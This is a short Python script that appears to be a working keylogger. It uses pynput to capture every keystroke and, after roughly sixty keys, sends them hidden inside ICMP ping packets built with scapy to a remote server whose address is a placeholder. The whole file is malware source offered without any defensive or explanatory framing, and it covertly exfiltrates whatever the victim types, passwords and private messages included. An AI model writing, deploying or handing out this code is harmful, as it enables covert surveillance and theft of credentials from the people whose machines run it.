#!/usr/bin/python3

import pynput
import os
from scapy.all import *

from pynput.keyboard import Key, Listener # type: ignore

server = "0.0.0.0" #place holder

keys = []

def send_packet(keys):
    ip_layer = IP(dst=server)
    icmp_layer = ICMP(type=8)

    packet = ip_layer / icmp_layer / str(keys)

    send(packet)

def on_press(key):
    global keys
    keys.append(str(key))
    if len(keys) > 60:
        send_packet(keys)
        keys = []



def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
